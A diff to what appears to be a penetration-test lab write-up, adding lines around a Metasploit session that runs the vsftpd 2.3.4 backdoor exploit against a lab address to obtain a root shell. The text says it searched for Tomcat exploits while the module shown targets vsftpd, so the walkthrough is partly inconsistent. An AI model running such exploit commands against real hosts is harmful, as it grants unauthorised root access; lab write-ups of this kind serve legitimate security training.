@@ -196,12 +196,14 @@ However, in this specific case, we will focus on exploiting port:
 # Find a functional exploit 
 We launched Metasploit and searched for exploits related to this version of Tomcat.
 
+We properly configured the exploit:
 ```python
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 172.16.25.2
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 ```
 
+This exploit run a Backdoor Command Execution and provides us with a root shell
 
 ![[Pasted image 20250512145918.png]]
 
